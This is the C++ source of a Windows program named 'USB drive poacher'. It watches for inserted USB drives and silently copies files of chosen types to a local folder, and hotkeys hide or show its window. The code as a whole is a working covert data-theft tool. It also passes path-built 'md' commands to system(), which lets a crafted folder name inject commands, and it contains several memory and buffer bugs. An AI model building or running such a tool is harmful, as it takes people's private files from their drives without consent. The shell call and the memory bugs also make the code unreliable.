#include <stdio.h>
#include "windows.h"
#include <Windowsx.h>
#include<Commdlg.h>  
#include "Shlwapi.h"
#include <string>
#include <vector>//使用向量数据结构
#include <list> 
//选择文件夹对话框  
#include<Shlobj.h> 
#include<Winuser.h> 
#pragma comment(lib,"Shell32.lib")  
#pragma comment(lib,"user32.lib")  
#pragma comment(lib,"Shlwapi.lib") 
using namespace std;
#define  IDC_EDIT_1  0x101							//过滤文本大小
#define  IDC_EDIT_2  0x102							//后缀名
#define  IDC_EDIT_3  0x103							//路径
#define  IDC_Button_1 0x104							//选择保存文件夹
#define  IDC_Button_2 0x105
#define  IDC_Button_3 0x106
#define  IDC_STATIC_1 0x107							//
HINSTANCE g_hInstance;								//全局主窗口载入地址
HANDLE	  g_hRunEvent;
HANDLE	  g_hThreads;
BOOL      g_bRun = FALSE;							//是否启动监控			
BOOL	  g_bIsStart = FALSE;						//扫描任务执行状态
struct tagConfig
{
	TCHAR m_HouZhui[30];
	DWORD m_FileSize;
	TCHAR m_FilePaht[MAX_PATH];
}tconfig;

struct WaitForProcessingFile
{
	TCHAR tcFileName;
	TCHAR tcFilePaht;
};
vector <WaitForProcessingFile> g_vlist;
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	//MessageBox(0, 0, 0, 0);
	//printf("uMsg : %d, wParam: %d, lParam: %d \n", uMsg, wParam, lParam);
	switch (uMsg)
	{
		case WM_DESTROY:
		{	
			PostQuitMessage(0);
			break;
		}
		case WM_CREATE:
		{
			//**********************************子窗口控件手动绘制Begin区域***********************************//
			/*文件大小选择 Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("请输入过滤的文件大小:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 10, 300, 20,hwnd,(HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("EDIT"), TEXT("0"), ES_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 40, 50, 20, hwnd, (HMENU)IDC_EDIT_1, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("STATIC"), TEXT(" MB (0为不限制,超出忽略)"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 60, 40, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			/*文件大小选择 End*/

			/*文件后缀名输入 Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("请输入要监控的文件: (空格分开)"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 80, 300, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("EDIT"), TEXT("*.text *.txt *.jpg"), ES_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 110, 260, 20, hwnd, (HMENU)IDC_EDIT_2, NULL, g_hInstance, NULL);
			/*文件后缀名输入 End*/

			/*保存路径	Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("文件备份路径:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 170, 300, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("EDIT"), TEXT("d:\\Upan_Back"), ES_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 200, 180, 20, hwnd, (HMENU)IDC_EDIT_3, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("BUTTON"), TEXT("选择"), BS_PUSHBUTTON | BS_TEXT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 200, 200, 70, 20, hwnd, (HMENU)IDC_Button_1, NULL, g_hInstance, NULL);
			/*保存路径	End*/

			/*快捷键说明 Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("快捷键说明:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 250, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("STATIC"), TEXT("Alt+F1隐藏窗口"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 280, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("STATIC"), TEXT("Alt+F2显示窗口"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 310, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			/*快捷键说明 End*/

			CreateWindow(TEXT("BUTTON"), TEXT("保存配置"), BS_PUSHBUTTON | BS_TEXT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 200, 280, 70, 45, hwnd, (HMENU)IDC_Button_2, NULL, g_hInstance, NULL);


			CreateWindow(TEXT("BUTTON"), TEXT("开启监控"), BS_PUSHBUTTON | BS_TEXT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 350, 260, 45, hwnd, (HMENU)IDC_Button_3, NULL, g_hInstance, NULL);

			CreateWindow(TEXT("STATIC"), TEXT("状态:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 420, 40, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);

			CreateWindow(TEXT("STATIC"), TEXT("已停止..."), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 50, 420, 200, 20, hwnd, (HMENU)IDC_STATIC_1, NULL, g_hInstance, NULL);
			//**********************************子窗口控件手动绘制End区域*************************************//
			break;
		}
		case WM_COMMAND:
		{
			switch (LOWORD(wParam))
			{
				case IDC_EDIT_3:
					//SetDlgItemText(hwnd, IDC_EDIT_1, TEXT("hello 308"));
					break;
				case IDC_Button_1:
				{
					TCHAR szBuffer[MAX_PATH] = { 0 };
					BROWSEINFO bi ;
					ZeroMemory(&bi, sizeof(bi));
					bi.hwndOwner = NULL;//拥有着窗口句柄，为NULL表示对话框是非模态的，实际应用中一般都要有这个句柄  
					bi.pszDisplayName = szBuffer;//接收文件夹的缓冲区  
					bi.lpszTitle = TEXT("选择一个文件夹");//标题  
					bi.ulFlags = BIF_NEWDIALOGSTYLE;
					LPITEMIDLIST idl = SHBrowseForFolder(&bi);
					if (SHGetPathFromIDList(idl, szBuffer)) {
						SetDlgItemText(hwnd, IDC_EDIT_3, szBuffer);
					}

					break;
				}
				case IDC_Button_2:
				{
					ZeroMemory(&tconfig, sizeof(tconfig));
					//GetDlgItemText(hwnd,IDC_EDIT_1, (LPWSTR)tconfig.m_FileSize, 30);
					tconfig.m_FileSize= GetDlgItemInt(hwnd, IDC_EDIT_1, NULL, FALSE);
					GetDlgItemText(hwnd, IDC_EDIT_2,tconfig.m_HouZhui, 30);
					GetDlgItemText(hwnd, IDC_EDIT_3, tconfig.m_FilePaht, MAX_PATH);
					if (wcslen(tconfig.m_FilePaht) > 0 && tconfig.m_HouZhui > 0)
					{
						MessageBox(hwnd, L"保存成功", L"提示", MB_OK);
					}
					break;
				}
				case IDC_Button_3:
					if (g_bRun)
					{
						ResetEvent(g_hRunEvent);
						SetDlgItemText(hwnd, IDC_Button_3, L"启动监控");
						SetDlgItemText(hwnd, IDC_STATIC_1, L"已停止...");
						g_bRun = FALSE;
						g_bIsStart = FALSE; //停止所有任务


					}
					else
					{
						SetEvent(g_hRunEvent);
						SetDlgItemText(hwnd, IDC_Button_3, L"停止监控");
						SetDlgItemText(hwnd, IDC_STATIC_1, L"运行中...");
						g_bRun = TRUE;
					}
				break;
			}

			break;
		}
		case WM_SYSCOMMAND:
		{
			if (wParam == 61488)//禁止窗口最大化
			{
				printf("禁止窗口最大化 uMsg : %d, wParam: %d, lParam: %d \n", uMsg, wParam, lParam);
				break;
			}
		}
		case WM_KEYDOWN:
		{
		}
		default:
		{
			return DefWindowProc(hwnd, uMsg, wParam, lParam);
		}
	}
}


bool IsUsbDevice(wchar_t letter)
{
	wchar_t volumeAccessPath[] = L"\\\\.\\X:";
	volumeAccessPath[4] = letter;

	HANDLE deviceHandle = CreateFile(
		volumeAccessPath,
		0,                // no access to the drive
		FILE_SHARE_READ | // share mode
		FILE_SHARE_WRITE,
		NULL,             // default security attributes
		OPEN_EXISTING,    // disposition
		0,                // file attributes
		NULL);            // do not copy file attributes

						  // setup query
	STORAGE_PROPERTY_QUERY query;
	memset(&query, 0, sizeof(query));
	query.PropertyId = StorageDeviceProperty;
	query.QueryType = PropertyStandardQuery;

	// issue query
	DWORD bytes;
	STORAGE_DEVICE_DESCRIPTOR devd;
	STORAGE_BUS_TYPE busType = BusTypeUnknown;

	if (DeviceIoControl(deviceHandle,
		IOCTL_STORAGE_QUERY_PROPERTY,
		&query, sizeof(query),
		&devd, sizeof(devd),
		&bytes, NULL))
	{
		
		busType = devd.BusType;
	}

	CloseHandle(deviceHandle);

	return BusTypeUsb == busType;
}

// 查找U盘
// 参数:  _letter 存储U盘盘符
// 返回值:true 当前有U盘
//       false 当前无U盘
bool findUSBStorage(wchar_t* _letter)
{
	DWORD mask = GetLogicalDrives();
	int count = 0;
	while (mask != 0)
	{
		if ((mask & 0x01) == 1)
		{
			wchar_t letter = L'A' + count;

			// 判断取得的盘符是否是U盘
			if (IsUsbDevice(letter))
			{
				wcscpy(_letter,&letter);
				return true;
			}
		}
		count++;
		mask = mask >> 1;
	}
	return false;
}

TCHAR* splist(TCHAR * str, TCHAR seg[])
{
	/*分隔符这里为逗号comma，分隔符可以为你指定的，如分号，空格等*/
	TCHAR charlist[50][50] = { L"\0" };/*指定分隔后子字符串存储的位置，这里定义二维字符串数组*/
	int i = 0;
	TCHAR *substr = wcstok(str, seg);/*利用现成的分割函数,substr为分割出来的子字符串*/

	while (substr != NULL) {
		wcscpy(charlist[i], substr);/*把新分割出来的子字符串substr拷贝到要存储的charlsit中*/
		i++;
		//printf("%s\n", substr);
		substr = wcstok(NULL, seg);/*在第一次调用时，strtok()必需给予参数str字符串，
								   往后的调用则将参数str设置成NULL。每次调用成功则返回被分割出片段的指针。*/
	}
	return *charlist;
}

// wchar_t to string
void Wchar_tToString(std::string& szDst, wchar_t *wchar)
{
	wchar_t * wText = wchar;
	DWORD dwNum = WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, NULL, 0, NULL, FALSE);// WideCharToMultiByte的运用
	char *psText;  // psText为char*的临时数组，作为赋值给std::string的中间变量
	psText = new char[dwNum];
	WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, psText, dwNum, NULL, FALSE);// WideCharToMultiByte的再次运用
	szDst = psText;// std::string赋值
	delete[]psText;// psText的清除
}
BOOL CreateDeepDirectory(LPCTSTR lpPathName,        //directory name
	LPSECURITY_ATTRIBUTES lpSecurityAttributes  // SD
)
{
	if (PathFileExists(lpPathName))       //如果目录已存在，直接返回
	{
		return TRUE;
	}

	string strPath = "";
	TCHAR pszSrc[MAX_PATH] = { 0 };
	wcscpy(pszSrc, lpPathName);
	TCHAR *ptoken = wcstok(pszSrc, L"\\");
	while (ptoken)
	{
		string strTmp = "";
		Wchar_tToString(strTmp, ptoken);
		strPath += strTmp;
		strPath += "\\";

		string mystring = strPath;
		int mystringSize = (int)(mystring.length() + 1);
		wchar_t* mywstring = new wchar_t[mystringSize];
		MultiByteToWideChar(CP_ACP, 0, mystring.c_str(), -1, mywstring, mystringSize);


		if (!PathFileExists(mywstring))
		{                   //创建失败时还应删除已创建的上层目录，此次略
			if (!CreateDirectory(mywstring, lpSecurityAttributes))
			{
				printf("创建失败 错误%d", GetLastError());
				delete[] mywstring;
				continue;
			}
		}
		delete[] mywstring;
		ptoken = wcstok(NULL, L"\\");
	}
	return TRUE;
}
vector<WaitForProcessingFile> g_vCreatFilee;
bool CreatFileTreeforlist(wchar_t* filepaht)
{
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	TCHAR szFullPath[MAX_PATH];//绝对路径
	HANDLE hFind = INVALID_HANDLE_VALUE;
	list<WIN32_FIND_DATA > m_lFfdList;
	
	TCHAR t[MAX_PATH] = { L"\0" };
	wsprintf(t, L"%S:\\*.*", filepaht);
	hFind = FindFirstFile(t, &ffd);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		printf("FindFirstFile error");
		return 0;
	}

	do
	{
		m_lFfdList.push_back(ffd);
	} while (FindNextFile(hFind, &ffd) != 0); //没有文件时 推出
	//根节点读完
	list <WIN32_FIND_DATA >::iterator m_lFIter;
	while (m_lFfdList.size())
	{
		WIN32_FIND_DATA  m_wFIter = (WIN32_FIND_DATA)*m_lFIter;

		m_lFIter=m_lFfdList.begin();

		TCHAR t[MAX_PATH] = { L"\0" };
		wsprintf(t, L"%S:", filepaht);
		string sAddPath = "";
		Wchar_tToString(sAddPath, t);
		sAddPath += "\\";
		string addstrignTem = "";
		Wchar_tToString(addstrignTem, m_wFIter.cFileName);
		sAddPath += addstrignTem;


		//如果是文件的话添加到链表里
		if (m_wFIter.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{

			
			
			sAddPath += "\\*.*";
			//循环目录下级子节点
			WIN32_FIND_DATA m_ffd;

			string mystring = sAddPath;
			int mystringSize = (int)(mystring.length() + 1);
			wchar_t* mywstring = new wchar_t[mystringSize];
			MultiByteToWideChar(CP_ACP, 0, mystring.c_str(), -1, mywstring, mystringSize);
			
			
			HANDLE hFind1 = INVALID_HANDLE_VALUE;
			hFind1 = FindFirstFile(mywstring, &m_ffd);
			
			//list<WIN32_FIND_DATA > m_lFfdListNodes;
			//list <WIN32_FIND_DATA >::iterator m_lFIterNode;
			if (INVALID_HANDLE_VALUE == hFind1)
			{
				
				printf("FindFirstFile error %d,权限不足使用管理员权限",GetLastError());
				m_lFfdList.pop_front();
				continue;
			}
			do
			{
				m_lFfdList.push_back(m_ffd);
			} while (FindNextFile(hFind1, &m_ffd) != 0); //没有文件时 推出
			printf("====================================目录一层解析完毕 \n");
			delete[] mywstring;
			FindClose(hFind1);
		}
		else
		{
			//如果是文件
		}
		m_lFfdList.pop_front();
	}

	FindClose(hFind);
	return true;
}

bool CreatFileTree(TCHAR filePath[], DWORD  &Size, DWORD  &Num, DWORD &Directory)
{
	printf("%d \n", GetLastError());
	int s1,s2,s3,s4 = 0;
	TCHAR szFind[MAX_PATH];       //定义一个要找的文件路径的量
	WIN32_FIND_DATA FindFileData;//WIN32_FIND_DATA结构描述了一个由FindFirstFile, FindFirstFileEx, 或FindNextFile函数查找到的文件信息
	HANDLE hFind;                //定义一个句柄 用于FindFirstFile()返回的值

	wcscpy(szFind, filePath);     //把从后者地址开始且含有NULL结束符的字符串赋值到前者开始的地址空间   
	wcscat(szFind, L"\\*.*");      //把后者所指字符串添加到前者结尾处(覆盖前者结尾处的'\0')并添加'\0'。利用通配符找这个目录下的所以文件，包括目录

	hFind = FindFirstFile(szFind, &FindFileData);  //FindFirstFile函数返回HANDLE类型的值 其中FILE_ATTRIBUTE_DIRECTORY 表明文件是一个目录文件

												   //通过FindFirstFile()函数,根据当前的文件存放路径查找该文件来把待操作文件的相关属性读取到WIN32_FIND_DATA结构中去  
	if (INVALID_HANDLE_VALUE == hFind)             //如果返回的是INVALID_HANDLE_VALUE表明目录不存在
	{
		if (GetLastError() == 5)
		{
			printf("请使用管理员权限！\n");
			return 0;
		}
		else {
			printf("目录不存在！\n");
			return 0;
		}
	}

	while (1)
	{   
		if (g_bIsStart==0)
		{
			printf("任务正在停止 ！\n");
			break;
		}
		//因为 FindFirstFile返回的 findData 中 dwFileAttributes项的值是一个组合的值
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) //做位的与运算来判断所找到的项目是不是文件夹
		{
			if (FindFileData.cFileName[0] != '.')                        //每个目录下有个..目录可以返回上一层。如果不是返回目录
																		 //.表示当前目录，因为每个目录下面都有两个默认目录就是..和.分别表示上一级目录和当前目录
			{
				Directory++;               //文件夹个数加一
				wcscpy(szFind, filePath);
				wcscat(szFind, L"\\");
				wcscat(szFind, FindFileData.cFileName);
				CreatFileTree(szFind, Size, Num, Directory);                   //如果当前文件是目录文件，则递归调用findFile 
			}
		}
		else
		{
			
			if (lstrcmp(FindFileData.cFileName, TEXT("."))!= 0 || lstrcmp(FindFileData.cFileName, TEXT("..")) != 0)
			{
				Num++;//文件个数加一
				Size += (long)(FindFileData.nFileSizeLow / 1024 );            //对文件的大小进行统计  FindFileData.nFileSizeLow是字节大小
			wprintf(L"----%s\\%s------------ %d字节 \n\r", filePath, FindFileData.cFileName, FindFileData.nFileSizeLow);//输出目录下的文件的路径和名称和大小
				printf("%d \n", GetLastError());
				//s1 = 
				if (tconfig.m_FileSize == 0 || tconfig.m_FileSize * 1024 * 1024 > FindFileData.nFileSizeLow)
				{
					
					TCHAR t[MAX_PATH] = { 0 };
					wsprintf(t, L"%s\\%s", filePath, FindFileData.cFileName);

					TCHAR*pExt = PathFindExtension(t);
		
					wchar_t * pwc = (wchar_t *)wcsstr(tconfig.m_HouZhui, pExt);
					if ( (wcslen(pExt)!=0) &&( pwc != NULL))
					{
						
						printf("%s", FindFileData.cAlternateFileName);

						//TCHAR newtlp[wcslen(tconfig.m_FilePaht)] = { L"/0" };
						TCHAR* newt2 = (TCHAR*)malloc(wcslen(filePath));
						if (newt2 == NULL)
						{
							printf("内存不够用了\n");
							return 0;
						}
						wcscpy(newt2, filePath);
						TCHAR* tlp1 = &newt2[2];
						TCHAR ts[MAX_PATH] = { 0 };
						wcscpy(ts, tconfig.m_FilePaht);
						wcscat(ts, tlp1);

						TCHAR szt[MAX_PATH] = { L"\0" };
						wsprintf(szt, L"md %s", ts);
						char cschar[MAX_PATH] = { "\0" };
						int iLength;
						//获取字节长度   
						iLength = WideCharToMultiByte(CP_ACP, 0, szt, -1, NULL, 0, NULL, NULL);
						//将ptchar值赋给pchar    
						WideCharToMultiByte(CP_ACP, 0, szt, -1, cschar, iLength, NULL, NULL);
						//WinExec(cschar, SW_HIDE);
						printf("%s \n",cschar);
						//system(cschar);

						TCHAR* tlp = &t[2];
						TCHAR* newt = (TCHAR*)malloc(wcslen(tconfig.m_FilePaht));
						if (newt != NULL)
						{
							wcscpy(newt, tconfig.m_FilePaht);
							wcscat(newt, tlp);


							TCHAR szt[MAX_PATH] = { L"\0" };
							wsprintf(szt, L"copy %s %s", t, newt);
							char cschar[MAX_PATH] = { "\0" };
							int iLength;
							//获取字节长度   
							iLength = WideCharToMultiByte(CP_ACP, 0, szt, -1, NULL, 0, NULL, NULL);
							//将ptchar值赋给pchar    
							WideCharToMultiByte(CP_ACP, 0, szt, -1, cschar, iLength, NULL, NULL);

							//WinExec(cschar, SW_HIDE);
							printf("%s \n", cschar);
							printf("%d \n", GetLastError());
						//	system(cschar);
							//if (!CopyFile(t, newt, 0))
							//{
							//	printf("复制失败 原因：%d\n", GetLastError());
								//return 0;
							//}
						}
					   // free(newt);
						//free(newt2); 
					}
				}
			}
		}
		s1 = GetLastError();
		if (FindNextFile(hFind, &FindFileData) == 0)
		{
		
			return 0;
		}
			//继续查找FindFirstFile函数搜索后的文件    非零表示成功，零表示失败
			                                                   //因此为0时，执行break
		s2 = GetLastError();
	}
	s3=GetLastError();
	FindClose(hFind);//关闭句柄
	s4 = GetLastError();

	printf("==============>%d %d %d %d \n", s1, s2, s3, s4);
	return 0;
}

DWORD WINAPI CopyProc(LPARAM lparam)
{
	DWORD num = 0;
	TCHAR srcFileName[MAX_PATH] = { 0 };//源文件名字 u盘里的文件
	TCHAR dstFileName[MAX_PATH] = { 0 };//复制的目标文件名
	TCHAR dstFilePath[MAX_PATH] = {0};//复制的路径名

	wsprintf(srcFileName, L"%s\\*.*", (TCHAR*)lparam);
	
	WIN32_FIND_DATA filefind;
	HANDLE h = FindFirstFile(srcFileName, &filefind);
	while (FindNextFile(h,&filefind)!=0)
	{
		//wsprintf(srcFileName,L"%s\\%s",())
		wsprintf(srcFileName, L"%s\\%s", (TCHAR *)lparam, filefind.cFileName);
		if(filefind.cFileName[0] == L'.' || (filefind.cFileName[0] == L'.' && filefind.cFileName[1] == L'.'))
		{
			continue;
		}
		if (filefind.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{

		//	wcscpy(dstFilePath, srcFileName);
			HANDLE hh= CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CopyProc, srcFileName, NULL,NULL);

			if (hh==NULL)
			{
				printf("error %d \n", GetLastError());
			}
			WaitForSingleObject(hh, INFINITE);
			CloseHandle(hh);
		}
		else
		{
			if (tconfig.m_FileSize != 0 && tconfig.m_FileSize * 1024 * 1024 < filefind.nFileSizeLow)
			{
				continue;
			}

			TCHAR*pExt = PathFindExtension(srcFileName);
			wchar_t * pwc = (wchar_t *)wcsstr(tconfig.m_HouZhui, pExt);
			if ((wcslen(pExt) == 0) || (pwc == NULL))
			{
				printf("不符合后缀名的文件过滤 %S \n", srcFileName);
				continue;
			}
			
			/*得到目标目录文件 dstFileName*/
			TCHAR* newt2 = (TCHAR*)malloc(sizeof(dstFileName));
			if (newt2 == NULL)
			{
				printf("内存不够用了\n");
				return 0;
			}
			memset(newt2, 0, sizeof(dstFileName));
			memcpy_s(newt2, sizeof(dstFileName),srcFileName, sizeof(srcFileName));
			TCHAR* tlp1 = &newt2[2]; //把地址交给tlp1
			TCHAR ts[MAX_PATH] = { L"\0" };
			wcscpy(ts, tconfig.m_FilePaht);

			wcscat(ts, tlp1);
			wcscpy(dstFileName,ts);
			free(newt2);



			//得到目标目录 dstFilePath    源文件是srcFileName
			
			DWORD cFileNameLen= wcslen(filefind.cFileName);
			DWORD dstFileNameLen = wcslen(ts);
			//TCHAR* tlp = (TCHAR*)malloc(dstFileNameLen - cFileNameLen);
			TCHAR tlp[MAX_PATH] = { L"\0" };
			//wcscpy(tlp, ts[dstFileNameLen - cFileNameLen]);
			for (DWORD i = 0; i < dstFileNameLen - cFileNameLen; i++)
			{
				tlp[i] = ts[i];
			}
			wcscpy(dstFilePath, tlp);
			
			if (PathFileExists(dstFilePath) == FALSE)
			{
				//转换字节 执行创建目录
				TCHAR szt[MAX_PATH] = { L"\0" };
				wsprintf(szt, L"md %s", dstFilePath);
				char cschar[MAX_PATH] = { "\0" };
				int iLength;
				//获取字节长度   
				iLength = WideCharToMultiByte(CP_ACP, 0, szt, -1, NULL, 0, NULL, NULL);
				//将ptchar值赋给pchar    
				WideCharToMultiByte(CP_ACP, 0, szt, -1, cschar, iLength, NULL, NULL);

				//WinExec(cschar, SW_HIDE);
				system(cschar);
				printf("%s \n", cschar);
			}
			CopyFile(srcFileName, dstFileName, false);
			
			continue;
		}

	}
	//CloseHandle(h);
	return 0;
}

DWORD WINAPI ThreadProc(LPVOID)
{
	wchar_t* wchPan[20] = {L"\0"};
	
	//每过一秒钟扫描磁盘信息，检查是否存在新可移动硬盘和U盘
	while (true)
	{
		
		DWORD dwWaitResult = WaitForSingleObject(g_hRunEvent, INFINITE);
		switch (dwWaitResult)
		{
			case WAIT_OBJECT_0:
			{	
				wchar_t wc[] = {L"\0"};
				bool isUsb = findUSBStorage(wc);
				if (isUsb)
				{
					/*
					for (DWORD i =0;i<sizeof(wchPan)/sizeof(wchPan[0]);i++)
					{
						if (wchPan[i] == wc)
						{
							printf("============新u潘已经存在 %s================\n", wchPan[i]);
						}
						else {

							wchPan[i] = wc;
							printf("============发现硬盘了 %s================\n", wchPan[i]);
						}
					}*/
					if (g_bIsStart)
					{
						//发现扫描进程启动的话，就不再启动扫描
						continue;
					}
					else
					{
						g_bIsStart = TRUE;
						printf("============启动进程开始读文件了================\n");
						//Todo::生成文件树队列
						
						DWORD Size = 0, Num = 0, Directory = 0;    //定义Size为文件大小，Num为文件个数，Directory为文件夹个数
						TCHAR input[MAX_PATH];             //定义输入文件路径的字符数组
						//printf("输入想要遍历的目录。如：C:\\\\windows 或 C:\\\\Documents and Settings\n");
						wsprintf(input,L"%S:", wc);
						//CreatFileTree(input, Size, Num, Directory);//执行子函数findFile
						HANDLE h = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CopyProc, input, NULL, NULL);
						WaitForSingleObject(h, INFINITE);
						if (h == NULL)
						{
							printf("CreateThread error %d", getchar());
						}
						
					//	wprintf(L"\n总共大小：%lldKB\n文件个数：%lld\n文件夹个数：%lld\n文件平均大小：%lldKB\n每个目录平均文件个数：%lld\n\n", Size, Num, Directory, Size / Num, Num / Directory);
						printf("----------------------------%d \n", GetLastError());
						//WaitForProcessingFile file;
						//g_vlist.push_back(st);
					}
					
				}
				else
				{
					g_bIsStart = FALSE;
				}
				break;
			}
			default:
				printf("Wait error (%d)\n", GetLastError());
				return 0;
		}
		//Sleep(1000);
	}
}


int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	//1,定义窗口结构体，并且注册窗口类;
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	g_hInstance = hInstance;
	WNDCLASS wMainClass;
	ZeroMemory(&wMainClass, sizeof(wMainClass));
	wMainClass.lpszClassName = L"U盘偷猎者 by bcjc308";
	wMainClass.hbrBackground =(HBRUSH) COLOR_WINDOW;
	wMainClass.lpfnWndProc = WindowProc;
	wMainClass.hInstance = g_hInstance;
	if (!RegisterClass(&wMainClass))
	{
		printf("注册窗口类失败!");
		return 0;
	} 
	//2,创建窗体
	HWND hwndMain = CreateWindow(L"U盘偷猎者 by bcjc308", L"U盘偷猎者 by bcjc308", WS_OVERLAPPEDWINDOW^WS_THICKFRAME, 400, 150, 300, 500, NULL, NULL, g_hInstance, NULL);
	if (hwndMain == NULL)
	{
		printf("窗口创建失败!");
		return 0;
	}
	ShowWindow(hwndMain, SW_SHOW);

	//3,注册全局快捷键消息 F1 F2
	if (!RegisterHotKey(NULL,1,MOD_ALT | MOD_NOREPEAT, VK_F1)) 
	{
		printf("Hotkey 'ALT+F1' registered, using MOD_NOREPEAT flag\n");
	}
	if (!RegisterHotKey(NULL, 1, MOD_ALT | MOD_NOREPEAT, VK_F2))  
	{
		printf("Hotkey 'ALT+F2' registered, using MOD_NOREPEAT flag\n");
	}

	g_hRunEvent =CreateEvent(NULL, TRUE, false, L"RunEvent");
	if (g_hRunEvent == NULL)
	{
		printf("CreateEvent failed (%d)\n", GetLastError());
		return 0;
	}
	LPDWORD lpThreadId = 0;
    g_hThreads= CreateThread(NULL, 1024 * 1024*1024, ThreadProc, NULL, 0, lpThreadId);
	if (g_hThreads == NULL)
	{
		printf("CreateThread failed (%d)\n", GetLastError());
		return 0;
	}
	//4,获取消息
	MSG msg;
	ZeroMemory(&msg, sizeof(msg));
	BOOL bRet = 0;
	while (bRet = GetMessage(&msg, NULL, 0, 0) != 0)
	{
		if (bRet==-1)
		{
			printf("获取消息队列失败，错误码：%d", GetLastError());
				return 0;
		} 
		/*隐藏与显示主窗口界面 Begin*/
		else if (msg.message == WM_HOTKEY)
		{
			
			if (msg.lParam == 7340033) 
			{
				ShowWindow(hwndMain, SW_HIDE);
				printf("f1 \n");
				continue;
			}
			if (msg.lParam == 7405569)
			{
				ShowWindow(hwndMain, SW_SHOW);
				printf("f2 \n");
				continue;
			}
		}
		/*隐藏与显示主窗口界面End*/
		else
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

	}

	FreeConsole();
	CloseHandle(g_hRunEvent);
	return 1;

}
